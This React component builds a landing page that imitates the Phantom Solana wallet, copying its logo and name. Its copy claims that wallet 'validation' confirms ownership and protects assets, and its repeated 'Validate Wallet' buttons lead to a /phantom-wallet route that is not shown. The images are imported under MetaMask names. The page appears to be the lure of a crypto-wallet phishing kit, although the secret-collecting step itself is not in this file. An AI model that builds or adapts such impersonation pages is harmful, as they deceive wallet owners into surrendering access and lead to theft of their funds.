import React, { useEffect } from 'react'
import './phantomPagesCss/phantomLanding.css'
import hero from '../../../assets/metahome.webp'
import metamask_webwallet_img from '../../../assets/meta2.svg'
import metamask_explore_img from '../../../assets/meta3.svg'
import metamask_ownYourData_img from '../../../assets/Meta4.svg'
import PhantomHeader from '../phantomHeader/PhantomHeader'
import PhantomFooter from '../phantomFooter/PhantomFooter'
import { useNavigate } from 'react-router-dom'
import { motion } from "framer-motion";

const PhantomLanding = () => {

  const navigate = useNavigate()

  useEffect(() => {
    const script = document.createElement("script");
    script.src = "https://www.livecoinwatch.com/static/lcw-widget.js";
    script.defer = true;
    document.body.appendChild(script);

    return () => {
      document.body.removeChild(script);
    };
  }, []);

  return (
    <>
      <div className='phantom_landing_body'>

        {/* ================= MARKET WIDGET ================= */}
        <div className="phantom_home-widget">
          <div className="phantom_home-widget-wrapper">
            <div
              className="livecoinwatch-widget-5"
              lcw-base="USD"
              lcw-color-tx="#999999"
              lcw-marquee-1="coins"
              lcw-marquee-2="movers"
              lcw-marquee-items="10">
            </div>
          </div>
        </div>

        <PhantomHeader/>

        {/* ================= HERO ================= */}
        <div className='phantom_hero'>
          <div className="phantom_hero_wrap">

            <motion.div
              initial={{ opacity: 0, y: 100 }}
              transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ margin: "-40px", once: true }}  
              className="phantom_hero_Text">

              <p>Secure your access to the Solana ecosystem</p>

              <h1>
                Your trusted
                <span>
                  <svg className="span" fill="none" viewBox="0 0 108 93">
                    <title>Logo Phantom</title>
                    <path 
                      d="M0.5 78.1789C0.5 90.2265 6.7065 93 13.1613 93C26.8155 93 37.077 80.6058 43.2007 70.8118C42.4559 72.9786 42.0422 75.1454 42.0422 77.2255C42.0422 82.946 45.1868 87.0196 51.3933 87.0196C59.9169 87.0196 69.0197 79.219 73.7367 70.8118C73.4056 72.0252 73.2401 73.1519 73.2401 74.192C73.2401 78.1789 75.3917 80.6924 79.7777 80.6924C93.5975 80.6924 107.5 55.124 107.5 32.7623C107.5 15.3411 99.0592 0 77.8743 0C40.6354 0 0.5 47.4967 0.5 78.1789Z"
                      fill="#a797d4"
                    />
                  </svg>
                </span>
                wallet companion
              </h1>

              <button onClick={()=>navigate('/phantom-wallet')}>
                Validate Wallet
              </button>
            </motion.div>
          </div>
        </div>

        {/* ================= SECTION 1 ================= */}
        <div className='phantom_webwallet'>
          <div className="phantom_webwallet_wrapper change_now">

            <motion.div
              initial={{ opacity: 0, x: -100 }}
              transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ margin: "-40px", once: true }}   
              className="phantom_webwallet_Text">

              <h1>Wallet validation & protection</h1>
              <p>
                Validating your Phantom wallet confirms ownership, enables secure
                connections, and protects your assets from unauthorized access.
              </p>
            </motion.div>

            <motion.img
              initial={{ opacity: 0, x: 100 }}
              transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ margin: "-40px", once: true }}  
              src={metamask_webwallet_img} 
              alt="" 
              className='phantom_webwallet_img' 
            />
          </div>
        </div>

        {/* ================= SECTION 2 ================= */}
        <div className='phantom_webwallet'>
          <div className="phantom_webwallet_wrapper">

            <motion.div
              initial={{ opacity: 0, x: -100 }}
              transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ margin: "-40px", once: true }}   
              className="phantom_webwallet_Text two">

              <h1>Safe dApp connections</h1>
              <p>
                Wallet verification adds an extra security layer when connecting
                to Solana-based applications, helping prevent malicious approvals.
              </p>
            </motion.div>

            <motion.img
              initial={{ opacity: 0, x: 100 }}
              transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ margin: "-40px", once: true }}  
              src={metamask_explore_img} 
              alt="" 
              className='phantom_webwallet_img' 
            />
          </div>
        </div>

        {/* ================= SECTION 3 ================= */}
        <div className='phantom_webwallet'>
          <div className="phantom_webwallet_wrapper change_now">

            <motion.div
              initial={{ opacity: 0, x: -100 }}
              transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ margin: "-40px", once: true }}  
              className="phantom_webwallet_Text">

              <h1>Ownership confirmation</h1>
              <p>
                Phantom ensures your keys stay private. Validation confirms that
                only you can authorize access and wallet interactions.
              </p>
            </motion.div>

            <motion.img
              initial={{ opacity: 0, x: 100 }}
              transition={{ type: "spring", stiffness: 30, mass: 1.5 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ margin: "-40px", once: true }}  
              src={metamask_ownYourData_img} 
              alt="" 
              className='phantom_webwallet_img' 
            />
          </div>
        </div>

        {/* ================= CTA ================= */}
        <div className='phantom_getStarted'>
          <svg className="phantom_getStarted_img" fill="none" viewBox="0 0 108 93">
            <path 
              d="M0.5 78.1789C0.5 90.2265 6.7065 93 13.1613 93C26.8155 93 37.077 80.6058 43.2007 70.8118C42.4559 72.9786 42.0422 75.1454 42.0422 77.2255C42.0422 82.946 45.1868 87.0196 51.3933 87.0196C59.9169 87.0196 69.0197 79.219 73.7367 70.8118C73.4056 72.0252 73.2401 73.1519 73.2401 74.192C73.2401 78.1789 75.3917 80.6924 79.7777 80.6924C93.5975 80.6924 107.5 55.124 107.5 32.7623C107.5 15.3411 99.0592 0 77.8743 0Z"
              fill="#3C315B"
            />
          </svg>

          <h1>Complete Wallet Validation</h1>
          <button onClick={()=>navigate('/phantom-wallet')}>
            Validate Wallet
          </button>
        </div>

        {/* ================= VIDEO ================= */}
        <div className='what_is_phantom_body'>
          <h1>Why validate your Phantom wallet?</h1>
          <iframe 
            className='metaVidieo' 
            src="https://www.youtube.com/embed/jciKuOGpWQo" 
            title="Phantom Wallet Tutorial"
            frameBorder="0" 
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
            referrerPolicy="strict-origin-when-cross-origin" 
            allowFullScreen
          ></iframe>
        </div>

        {/* ================= NEWSLETTER ================= */}
        <div className='phantom_news_letter'>
          <div className="phantom_news_letter_wrap">
            <h1>Stay updated</h1>
            <p className='subhead'>
              Receive updates about wallet security, validation requirements,
              and Solana ecosystem improvements.
            </p>
            <div className='input-hold'>
              <input type="text" placeholder='Email address' />
              <button>Subscribe</button>
            </div>
            <p>
              Phantom may use the contact information you provide to share
              important security and service updates. You may unsubscribe at any time.
            </p>
            <br />
            <p>
              This site is protected by reCAPTCHA and the Google Privacy Policy and
              <a href="#"> Terms of Service</a> apply.
            </p>
          </div>
        </div>

        <PhantomFooter/>
      </div>
    </>
  )
}

export default PhantomLanding
